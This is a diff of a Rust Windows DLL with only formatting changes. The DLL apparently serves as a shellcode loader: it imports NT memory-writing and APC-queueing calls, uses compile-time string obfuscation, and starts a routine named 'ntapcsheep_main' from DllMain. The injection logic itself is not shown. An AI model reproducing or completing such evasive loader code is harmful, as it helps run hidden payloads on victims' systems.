@@ -1,14 +1,14 @@
 #![cfg(windows)]
-use windows::Win32::Foundation::{BOOL, HINSTANCE, HWND};
-use windows::core::s;
-use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
-use windows::Win32::UI::WindowsAndMessaging::MessageBoxA;
 use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory};
 use ntapi::ntpsapi::{
     NtCurrentProcess, NtCurrentThread, NtQueueApcThread, NtTestAlert, PPS_APC_ROUTINE,
 };
 use ntapi::winapi::ctypes::c_void;
 use std::ptr::null_mut;
+use windows::core::s;
+use windows::Win32::Foundation::{BOOL, HINSTANCE, HWND};
+use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
+use windows::Win32::UI::WindowsAndMessaging::MessageBoxA;
 //string obfuscation on compile time
 use ntapi::ntpsapi::{NtQueryInformationProcess, PROCESS_BASIC_INFORMATION};
 use obfstr::obfstr;
@@ -18,17 +18,16 @@ use std::mem::zeroed;
 use std::thread;
 use std::time::Duration;
 
-
 #[no_mangle]
 #[allow(non_snake_case, unused_variables)]
 extern "system" fn DllMain(hinstance: HINSTANCE, reason: u32, _: *mut std::ffi::c_void) -> BOOL {
     match reason {
         DLL_PROCESS_ATTACH => {
             thread::spawn(|| {
-                 ntapcsheep_main();
+                ntapcsheep_main();
             });
             //ntapcsheep_main(); -> does not work
-        },
+        }
         _ => {}
     }
     true.into()
